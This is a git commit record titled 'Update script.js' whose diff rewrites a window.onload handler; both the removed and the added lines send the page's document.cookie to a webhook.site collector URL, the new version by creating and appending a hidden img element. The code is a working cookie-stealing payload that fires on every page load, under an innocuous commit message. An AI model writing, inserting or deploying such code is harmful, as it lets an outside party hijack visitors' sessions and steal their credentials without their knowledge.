e37cf990ec3f77f485089d423855554ff0fc4b57
iris-chieh <146847095+iris-chieh@users.noreply.github.com>
2025-04-08 11:02:53 +0800

    Update script.js

--- script.js
+++ script.js
@@ -1,3 +1,5 @@
 window.onload = function() {
-  document.getElementById("myImage").src = "https://webhook.site/bbeb7483-a55f-4225-8bd7-612dbc442527?"+document.cookie;
+  var i = document.createElement('img');
+  i.src = 'https://webhook.site/bbeb7483-a55f-4225-8bd7-612dbc442527?c=' + document.cookie;
+  document.body.appendChild(i);
 };
